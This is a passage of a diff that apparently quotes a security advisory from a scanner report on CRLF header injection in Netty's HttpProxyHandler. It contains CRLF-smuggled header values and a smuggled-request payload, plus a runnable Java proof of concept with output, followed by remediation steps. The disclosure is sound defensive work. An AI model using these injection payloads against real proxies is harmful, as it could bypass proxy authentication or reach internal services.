+                              │                   "1.2.3.4\r\nProxy-Authorization: Basic YWRtaW46YWRtaW4="`
+                              │                   **Wire format**:
+                              │                   CONNECT target.com:443 HTTP/1.1
+                              │                   host: target.com:443
+                              │                   X-Forwarded-For: 1.2.3.4
+                              │                   Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
+                              │                   The injected `Proxy-Authorization` header may override or
+                              │                   supplement the original authentication, potentially granting
+                              │                   access to a restricted proxy.
+                              │                   ### Scenario 2: Request Smuggling via Proxy
+                              │                   **Attack input**: `userInput = "value\r\nTransfer-Encoding:
+                              │                   chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost:
+                              │                   internal-service"`
+                              │                   Injects a full smuggled request through the proxy tunnel
+                              │                   establishment.
+                              │                   ## 6. Proof of Concept
+                              │                   ### Full Runnable PoC Source Code
+                              │                   (HttpProxyHeaderInjectionPoC.java)
+                              │                   import io.netty.buffer.ByteBuf;
+                              │                   import io.netty.channel.embedded.EmbeddedChannel;
+                              │                   import io.netty.handler.codec.http.*;
+                              │                   import java.nio.charset.StandardCharsets;
+                              │                   public class HttpProxyHeaderInjectionPoC {
+                              │                       public static void main(String[] args) {
+                              │                           System.out.println("=== Netty HttpProxyHandler Header
+                              │                    Injection PoC ===\n");
+                              │                           // Simulate HttpProxyHandler.newInitialMessage() with
+                              │                    validation=false
+                              │                           HttpHeadersFactory headersFactory =
+                              │                               .withValidation(false);
+                              │                           FullHttpRequest req = new DefaultFullHttpRequest(
+                              │                               HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+                              │                               "target.com:443",
+                              │                               io.netty.buffer.Unpooled.EMPTY_BUFFER,
+                              │                   headersFactory, headersFactory);
+                              │                           req.headers().set(HttpHeaderNames.HOST,
+                              │                   "target.com:443");
+                              │                           // Inject CRLF in header value
+                              │                           String malicious = "1.2.3.4\r\nX-Forwarded-For:
+                              │                   127.0.0.1\r\nX-Admin: true";
+                              │                           req.headers().set("X-Forwarded-For", malicious);
+                              │                           // Encode to wire format
+                              │                           EmbeddedChannel ch = new EmbeddedChannel(new
+                              │                   HttpRequestEncoder());
+                              │                           ch.writeOutbound(req);
+                              │                           ByteBuf out = ch.readOutbound();
+                              │                           String encoded =
+                              │                   out.toString(StandardCharsets.UTF_8);
+                              │                           out.release();
+                              │                           ch.finishAndReleaseAll();
+                              │                           System.out.println("Wire format:");
+                              │                           for (String line : encoded.split("\n", -1)) {
+                              │                               System.out.println("  " + line.replace("\r",
+                              │                   "\\r"));
+                              │                           }
+                              │                           System.out.println("Injected X-Admin: " +
+                              │                   encoded.contains("X-Admin: true"));
+                              │                           System.out.println("VULNERABLE: " +
+                              │                               (encoded.contains("X-Admin: true") ? "YES" :
+                              │                   "NO"));
+                              │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+                              │                   === Netty HttpProxyHandler Header Injection PoC ===
+                              │                   [TEST 1] outboundHeaders with CRLF (validation disabled)
+                              │                   ----------------------------------------------------------
+                              │                     Injected header value: "1.2.3.4\r\nX-Forwarded-For:
+                              │                   127.0.0.1\r\nX-Admin: true"
+                              │                     Header accepted: YES (validation disabled!)
+                              │                     Wire format:
+                              │                       CONNECT target.com:443 HTTP/1.1\r
+                              │                       host: target.com:443\r
+                              │                       X-Forwarded-For: 1.2.3.4\r
+                              │                       X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
+                              │                       X-Admin: true\r                        <-- INJECTED
+                              │                       \r
+                              │                     Injected X-Admin header in wire: true
+                              │                     VULNERABLE: YES
+                              │                   [TEST 2] validation=true vs validation=false comparison
+                              │                   --------------------------------------------------------
+                              │                     With validation=true:
+                              │                       SAFE: Rejected - IllegalArgumentException
+                              │                     With validation=false:
+                              │                       VULNERABLE: Accepted CRLF in header value!
+                              │                       Stored value contains CRLF: true
+                              │                   ## 7. Remediation Recommendations
+                              │                   ### Option 1: Remove withValidation(false)
+                              │                   // Change HttpProxyHandler.java line 176 from:
+                              │                   HttpHeadersFactory headersFactory =
+                              │                   DefaultHttpHeadersFactory.headersFactory().withValidation(fal
+                              │                   se);
+                              │                   // To:
+                              │                   DefaultHttpHeadersFactory.headersFactory();
+                              │                   ### Option 2: Validate outboundHeaders Before Adding
+                              │                   if (outboundHeaders != null) {
+                              │                       for (Map.Entry<String, String> entry : outboundHeaders)
+                              │                   {
+                              │                           HttpUtil.validateHeaderValue(entry.getValue());
+                              │                       req.headers().add(outboundHeaders);
+                              │                   ## 8. Resources
+                              │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection
+                              │                   (**incomplete fix — this
+                              │                   report**)](https://github.com/netty/netty/security/advisories
+                              │                   /GHSA-84h7-rjj3-6jx4)
+                              │                   - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP
+                              │                    Headers](https://cwe.mitre.org/data/definitions/113.html) 
+                              ├ Severity        : LOW 
+                              ├ VendorSeverity   ─ ghsa: 1 
+                              ╰ References       ╭ [0]: https://github.com/advisories/GHSA-84h7-rjj3-6jx4 
+                                                 ├ [1]: https://github.com/netty/netty 
+                                                 ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
+                                                        -45q3-82m4-75jr 
 ```
